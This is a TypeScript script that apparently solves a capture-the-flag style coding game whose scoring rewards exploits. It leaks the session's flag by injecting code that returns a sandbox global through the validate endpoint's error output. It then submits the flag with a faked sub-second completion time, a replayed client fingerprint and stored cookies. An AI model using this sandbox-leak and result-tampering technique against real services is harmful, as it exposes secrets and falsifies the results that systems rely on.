// End-to-end proof: read the v3 flag from THIS session's sandbox (via the validate
// leak in failedCase.actual), then finish the SAME session with it and confirm
// flag_finder (+150) fires. Also tells us whether the flag is per-session.
//
//   export CHEETCODE_GITHUB_PAT=ghp_...
//   CHEETCODE_GITHUB=<pat-owner-login> \   (throwaway; a low score can't hurt best-per-level)
//   CHEETCODE_FINGERPRINT_HINTS_PATH=recon-output/safari-session-2026-08-28T0008/fingerprint-hints.json \
//   npx tsx src/level1-claim-flag.ts
//
// ponytail: diagnostic; delete after flag_finder is confirmed.
import { promises as fs } from "node:fs";
import crypto from "node:crypto";
import { loadEnvFile } from "./env.js";
import { buildCookieHeader, buildFingerprintHints } from "./level1/api.js";
import { solveKnownProblem, extractFunctionName } from "./level1/solutions.js";
import type { LevelSession, FinishResponse, CheetProblem } from "./level1/types.js";
import { TARGET_URL, STORAGE_STATE_PATH } from "./recon/capture.js";

loadEnvFile();

const github = (process.env.CHEETCODE_GITHUB || "").trim();
if (!github) throw new Error("Set CHEETCODE_GITHUB.");
const storage = JSON.parse(await fs.readFile(STORAGE_STATE_PATH, "utf8"));
const cookie = buildCookieHeader(storage.cookies, new URL(TARGET_URL).hostname);
const hintsPath = process.env.CHEETCODE_FINGERPRINT_HINTS_PATH;
const fingerprintHints = hintsPath
  ? JSON.parse(await fs.readFile(hintsPath, "utf8"))
  : buildFingerprintHints(crypto.randomBytes(16).toString("hex"), Date.now());
const headers: Record<string, string> = {
  "content-type": "application/json",
  referer: TARGET_URL,
  cookie,
  "x-client-fingerprint": fingerprintHints.fingerprintId
};
if (process.env.CHEETCODE_GITHUB_PAT) headers["authorization"] = `Bearer ${process.env.CHEETCODE_GITHUB_PAT}`;

async function post<T>(path: string, body: unknown): Promise<T> {
  const r = await fetch(new URL(path, TARGET_URL), { method: "POST", headers, body: JSON.stringify(body) });
  const text = await r.text();
  if (!r.ok) throw new Error(`${path} ${r.status}: ${text.slice(0, 300)}`);
  return JSON.parse(text) as T;
}

// 1) fresh session
const session = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
const problems = session.problems as CheetProblem[];
const solved = problems.map(solveKnownProblem);
const unknown = solved.filter((s) => !s.known);
if (unknown.length) throw new Error(`Unknown L1 problems: ${unknown.map((u) => u.signature).join(", ")}`);

// 2) read THIS session's flag out of the sandbox via the validate leak
const p0 = problems[0];
const NAME = extractFunctionName(p0.signature)!;
const leak = await post<any>("/api/level-1/validate", {
  sessionId: session.sessionId,
  problemId: p0.id,
  code: `function ${NAME}(){ return String(globalThis.__ORCHARD_CTX__); }`
});
const flag: string = leak?.failedCase?.actual;
console.log("flag read from this session's sandbox:", JSON.stringify(flag));
if (!flag || typeof flag !== "string") throw new Error("Could not read flag from __ORCHARD_CTX__.");

// 3) finish the SAME session with the flag + sub-1s timing
const finish = await post<FinishResponse>("/api/level-1/finish", {
  sessionId: session.sessionId,
  github,
  timeElapsed: 400,
  submissions: solved.map((s) => ({ problemId: s.problemId, code: s.code })),
  flag
});
const a = finish.attempt as any;
console.log("\n=== FINISH ===");
console.log(`solved=${a.solved}/${a.total} status=${a.status} score=${a.score}`);
console.log(`scoreBreakdown=${JSON.stringify(a.scoreBreakdown)}`);
console.log(`exploits=${JSON.stringify(a.exploits, null, 1)}`);
console.log(`landmines=${JSON.stringify(a.landmines)}`);
const ids = (a.exploits ?? []).map((e: any) => e?.id);
console.log(`\nflag_finder fired: ${ids.includes("flag_finder")}`);
console.log(`speed_demon fired: ${ids.includes("speed_demon")}`);
